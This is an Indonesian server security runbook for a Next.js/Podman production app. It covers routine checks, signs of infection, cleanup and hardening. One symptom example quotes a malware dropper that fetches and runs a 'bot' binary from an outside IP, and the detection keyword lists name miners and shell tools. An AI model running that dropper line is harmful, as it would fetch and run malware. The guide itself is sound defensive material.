# 🔒 Panduan Keamanan Server NeuroBio NB-07

> Panduan lengkap untuk memeriksa dan menjaga keamanan server production

## 📋 Daftar Isi

1. [Pemeriksaan Keamanan Rutin](#pemeriksaan-keamanan-rutin)
2. [Tanda-tanda Server Terinfeksi](#tanda-tanda-server-terinfeksi)
3. [Cara Mengatasi Masalah Keamanan](#cara-mengatasi-masalah-keamanan)
4. [Pencegahan & Best Practices](#pencegahan--best-practices)
5. [Security Checklist Harian](#security-checklist-harian)

---

## 🔍 Pemeriksaan Keamanan Rutin

### 1. Cek Status Container

**Apa yang dicek:** Memastikan aplikasi berjalan normal tanpa error

```bash
# SSH ke server
ssh root@185.232.84.146

# Cek status container
su - neurox -c 'podman ps'

# Cek log container (cari kata-kata mencurigakan)
su - neurox -c 'podman logs --tail 50 neurox-app'
```

**❌ Tanda Bahaya:**
- Ada error seperti: `wget`, `curl`, `bot`, `miner`, `xmr`
- Process mencoba download file dari IP asing
- Error `connection refused` berulang-ulang

**✅ Seharusnya:**
```
✓ Starting...
✓ Ready in 134ms
```

---

### 2. Cek Versi Next.js

**Apa yang dicek:** Memastikan aplikasi menggunakan versi yang sudah di-patch

```bash
# Cek versi Next.js yang running
su - neurox -c 'podman exec neurox-app node -e "console.log(require(\"/app/node_modules/next/package.json\").version)"'
```

**✅ Versi Aman:**
- Next.js 16.0.10 atau lebih baru
- Next.js 15.6.0-canary.60 atau lebih baru

**❌ Versi Berbahaya:**
- Next.js 16.0.6 atau lebih lama (vulnerable CVE-2025-66478)
- Next.js 15.0.x - 15.5.x

---

### 3. Cek Login History

**Apa yang dicek:** Siapa saja yang login ke server

```bash
# Cek 20 login terakhir
last -20
```

**✅ Normal:**
- Hanya IP Anda sendiri
- Login time masuk akal (jam kerja)
- User: `root` atau `neurox`

**❌ Tanda Bahaya:**
- IP asing yang tidak dikenal
- Login tengah malam (kecuali Anda memang login)
- User aneh: `admin`, `hadoop`, `oracle`, `postgres`

---

### 4. Cek Failed Login Attempts

**Apa yang dicek:** Apakah ada yang mencoba brute force SSH

```bash
# Cek percobaan login gagal
lastb | head -20
```

**✅ Normal:**
- 0-10 failed attempts per hari
- Fail2ban aktif dan memblokir

**❌ Tanda Bahaya:**
- Ratusan failed attempts
- IP yang sama mencoba berulang kali
- Username: `root`, `admin`, `user`, `test`

**Solusi:** Sudah terinstall Fail2ban yang auto-block

---

### 5. Cek Process Mencurigakan

**Apa yang dicek:** Apakah ada malware running di host server

```bash
# Cek process mencurigakan
ps aux | grep -E 'bot|miner|xmr|crypto' | grep -v grep
```

**✅ Normal:**
- Command tidak menemukan apa-apa (return kosong)

**❌ Tanda Bahaya:**
- Ada process dengan nama: `bot`, `miner`, `xmrig`, `kinsing`
- Process menggunakan CPU 100%
- Process dari user `nobody` atau user aneh

---

### 6. Cek Network Connections

**Apa yang dicek:** Apakah server terkoneksi ke IP mencurigakan

```bash
# Cek koneksi aktif
ss -tunap | grep ESTABLISHED
```

**✅ Normal:**
```
Port 22  (SSH)
Port 80  (HTTP)
Port 443 (HTTPS)
Port 3000 (App)
```

**❌ Tanda Bahaya:**
- Koneksi ke IP China/Russia yang tidak dikenal
- Port aneh: 4444, 6666, 7777, 8888, 31337
- Banyak koneksi keluar yang tidak jelas

---

### 7. Cek File Mencurigakan

**Apa yang dicek:** Apakah ada file malware di /tmp

```bash
# Cek file di /tmp dan /var/tmp
find /tmp /var/tmp -type f -ls | head -20
```

**✅ Normal:**
- File temporary dengan nama normal
- File dari proses systemd atau aplikasi

**❌ Tanda Bahaya:**
- File bernama: `bot`, `sh`, `xmr`, `miner`
- File executable (.sh, binary tanpa ekstensi)
- File yang baru dibuat (timestamp hari ini)

---

### 8. Cek Cron Jobs

**Apa yang dicek:** Apakah ada scheduled task mencurigakan

```bash
# Cek cron root
crontab -l

# Cek cron semua user
for user in $(cut -d: -f1 /etc/passwd); do 
    echo "=== $user ==="
    crontab -u $user -l 2>/dev/null
done
```

**✅ Normal:**
- Tidak ada cron jobs, atau hanya cron jobs yang Anda buat

**❌ Tanda Bahaya:**
- Cron job yang mendownload file: `wget`, `curl`
- Cron job setiap menit: `* * * * *`
- Command yang mencurigakan

---

## 🚨 Tanda-tanda Server Terinfeksi

### Level 1: Suspek (Periksa Lebih Lanjut)
- ⚠️ CPU usage tiba-tiba tinggi (>80%)
- ⚠️ Traffic network meningkat drastis
- ⚠️ Disk space berkurang cepat
- ⚠️ Server lebih lambat dari biasanya

### Level 2: Kemungkinan Terinfeksi
- 🔴 Ada process dengan nama `bot`, `miner`
- 🔴 Log container ada error `wget`, `chmod 777`
- 🔴 Koneksi ke IP mencurigakan (China, Russia)
- 🔴 File baru di /tmp dengan nama aneh

### Level 3: PASTI Terinfeksi
- 🚨 Log menunjukkan download malware
- 🚨 Ada file bernama `bot` atau `xmrig`
- 🚨 Server mengirim traffic DDoS
- 🚨 Cron job yang tidak Anda buat

---

## 🛠️ Cara Mengatasi Masalah Keamanan

### Skenario 1: Container Terinfeksi Malware

**Gejala:**
```
Error: Command failed: wget http://45.131.184.34/bot
chmod 777 bot
./bot react
```

**Solusi (MUDAH - 5 menit):**

```bash
# 1. SSH ke server
ssh root@185.232.84.146

# 2. Stop dan hapus container lama
su - neurox -c 'podman stop neurox-app'
su - neurox -c 'podman rm neurox-app'

# 3. Hapus image terinfeksi
su - neurox -c 'podman rmi ghcr.io/anaknegeri/neurox:latest'

# 4. Pull image clean dari GitHub (pastikan sudah rebuild)
su - neurox -c 'podman pull ghcr.io/anaknegeri/neurox:latest'

# 5. Jalankan container baru
su - neurox -c 'podman run -d --name neurox-app -p 3000:3000 ghcr.io/anaknegeri/neurox:latest'

# 6. Cek log - harus bersih
su - neurox -c 'podman logs neurox-app'
```

**✅ Berhasil jika:** Log menunjukkan `✓ Ready in Xms` tanpa error

---

### Skenario 2: Next.js Versi Vulnerable

**Gejala:**
- Next.js versi 16.0.6 atau lebih lama
- Error `Cannot read properties of undefined (reading 'aa')`

**Solusi (SEDANG - 15 menit):**

```bash
# 1. Di komputer lokal, update package.json
cd /path/to/neurox

# Edit package.json, ubah:
# "next": "16.0.6" → "next": "16.0.10"

# 2. Install dan build
pnpm install
pnpm build

# 3. Commit dan push
git add package.json pnpm-lock.yaml
git commit -m "Security: Update Next.js to 16.0.10"
git push

# 4. Rebuild di server
ssh root@185.232.84.146

# Copy source code
rsync -avz --exclude 'node_modules' --exclude '.git' \
    /path/to/neurox root@185.232.84.146:/tmp/neurox-secure/

# Build image baru
cd /tmp/neurox-secure
su - neurox -c 'podman build -t neurox-secure:latest .'

# Deploy
su - neurox -c 'podman rm -f neurox-app'
su - neurox -c 'podman run -d --name neurox-app -p 3000:3000 neurox-secure:latest'

# 5. Verify
su - neurox -c 'podman exec neurox-app node -e "console.log(require(\"/app/node_modules/next/package.json\").version)"'
```

**✅ Berhasil jika:** Versi menunjukkan 16.0.10

---

### Skenario 3: SSH Brute Force Attack

**Gejala:**
```bash
lastb | head -20
# Banyak failed login dari IP asing
```

**Solusi (MUDAH - 5 menit):**

Fail2ban sudah terinstall dan akan auto-block. Tapi untuk extra security:

```bash
# 1. Ganti SSH port (opsional)
nano /etc/ssh/sshd_config

# Ubah:
# Port 22
# Menjadi:
Port 2222

# 2. Disable root login
# Tambahkan:
PermitRootLogin no

# 3. Restart SSH
systemctl restart sshd

# 4. Cek Fail2ban status
fail2ban-client status sshd
```

**PENTING:** Setelah ganti port, login dengan:
```bash
ssh -p 2222 root@185.232.84.146
```

---

### Skenario 4: Malware di Host Server (Bukan Container)

**Gejala:**
- Process mencurigakan di `ps aux`
- File aneh di `/tmp`
- CPU 100% terus menerus

**Solusi (SULIT - Hubungi Admin Jika Tidak Yakin):**

```bash
# 1. Kill process mencurigakan
ps aux | grep bot
# Catat PID-nya
kill -9 [PID]

# 2. Hapus file mencurigakan
rm -rf /tmp/bot /var/tmp/bot

# 3. Cek dan hapus cron jobs
crontab -e
# Hapus baris yang mencurigakan

# 4. Ganti password
passwd root
passwd neurox

# 5. Rotate SSH keys
mv ~/.ssh/authorized_keys ~/.ssh/authorized_keys.backup
# Copy public key Anda yang baru

# 6. Scan dengan rkhunter (opsional)
dnf install -y rkhunter
rkhunter --update
rkhunter --check
```

**⚠️ JIKA MASIH BERMASALAH:** Backup data, reinstall OS

---

## 🛡️ Pencegahan & Best Practices

### 1. Update Aplikasi Secara Rutin

**Frequency:** Setiap ada security update

**Cara cek update Next.js:**
```bash
# Di lokal
cd /path/to/neurox
npm outdated next

# Jika ada update security
pnpm add next@latest
pnpm build
git commit -am "Update Next.js"
git push
# Deploy ke production
```

**Resources:**
- https://nextjs.org/blog
- https://github.com/vercel/next.js/releases

---

### 2. Monitoring Real-time

**Setup Netdata (Opsional):**
```bash
# Install Netdata
bash <(curl -Ss https://get.netdata.cloud/kickstart.sh)

# Akses via: http://185.232.84.146:19999
```

**Yang di-monitor:**
- CPU, RAM, Disk usage
- Network traffic
- Running processes
- System logs

---

### 3. Backup Rutin

**Manual Backup Container:**
```bash
# Export container image
su - neurox -c 'podman save neurox-app > /tmp/neurox-backup-$(date +%Y%m%d).tar'

# Download ke lokal
scp root@185.232.84.146:/tmp/neurox-backup-*.tar ./
```

**Setup Auto Backup (Cron):**
```bash
# Edit crontab
crontab -e

# Tambahkan (backup setiap minggu)
0 2 * * 0 su - neurox -c 'podman save neurox-app > /backup/neurox-$(date +\%Y\%m\%d).tar'
```

---

### 4. Enable Firewall

**Di OnIdel Control Panel:**
1. Login ke https://onidel.com
2. Pilih server Anda
3. Security → Firewall
4. Enable firewall
5. Allow ports: 22, 80, 443

**Atau via UFW:**
```bash
# Install UFW
dnf install -y ufw

# Setup
ufw default deny incoming
ufw default allow outgoing
ufw allow 22/tcp
ufw allow 80/tcp
ufw allow 443/tcp
ufw enable
```

---

### 5. Rotate Secrets

**Setelah security incident:**
```bash
# 1. Ganti password server
passwd root
passwd neurox

# 2. Rotate SSH keys
ssh-keygen -t ed25519 -C "your_email@example.com"
# Copy ke ~/.ssh/authorized_keys

# 3. Ganti GitHub tokens
# GitHub → Settings → Developer settings → Personal access tokens
# Revoke old, generate new

# 4. Update secrets di GitHub Actions
# Repository → Settings → Secrets and variables → Actions
```

---

## ✅ Security Checklist Harian

**Print ini dan ceklis setiap hari:**

### Pagi (5 menit)
- [ ] Cek website https://neurox.ae - apakah bisa diakses?
- [ ] Cek container status: `podman ps`
- [ ] Cek log container: `podman logs --tail 20 neurox-app`

### Mingguan (15 menit)
- [ ] Cek failed login attempts: `lastb | head -20`
- [ ] Cek process mencurigakan: `ps aux`
- [ ] Cek disk space: `df -h`
- [ ] Cek versi Next.js: [lihat cara di atas](#2-cek-versi-nextjs)
- [ ] Update packages jika ada security update

### Bulanan (30 menit)
- [ ] Backup container image
- [ ] Review login history: `last -50`
- [ ] Check for OS updates: `dnf check-update`
- [ ] Review firewall rules
- [ ] Test restore dari backup

---

## 📞 Kapan Harus Minta Bantuan?

### Hubungi Security Expert Jika:

1. 🚨 **EMERGENCY (Segera):**
   - Server tidak bisa diakses
   - Website down lebih dari 30 menit
   - Ada ransomware note
   - Data hilang/terenkripsi

2. ⚠️ **URGENT (Hari ini):**
   - Malware terdeteksi di host (bukan container)
   - CPU 100% tidak turun-turun
   - Banyak koneksi ke IP asing
   - Cron job mencurigakan yang tidak bisa dihapus

3. 💡 **KONSULTASI (Minggu ini):**
   - Ingin setup monitoring
   - Ingin pengecekan security audit
   - Ingin setup backup otomatis
   - Performance lambat

---

## 📚 Resource Tambahan

### Official Documentation
- **Next.js Security:** https://nextjs.org/docs/security
- **Docker Security:** https://docs.docker.com/engine/security/
- **OWASP Top 10:** https://owasp.org/www-project-top-ten/

### Tools
- **Netdata:** https://www.netdata.cloud/ (Monitoring)
- **Fail2ban:** https://www.fail2ban.org/ (SSH Protection)
- **rkhunter:** http://rkhunter.sourceforge.net/ (Malware Scanner)

### Emergency Contacts
- **OnIdel Support:** support@onidel.com
- **GitHub Support:** https://support.github.com/

---

## 🔄 Version History

| Version | Date | Changes |
|---------|------|---------|
| 1.0.0 | 2025-12-18 | Initial security guide |
| 1.0.1 | 2025-12-18 | Added Fail2ban setup |

---

**Remember:** Keamanan adalah proses berkelanjutan, bukan sekali setup!

Stay safe! 🛡️🔒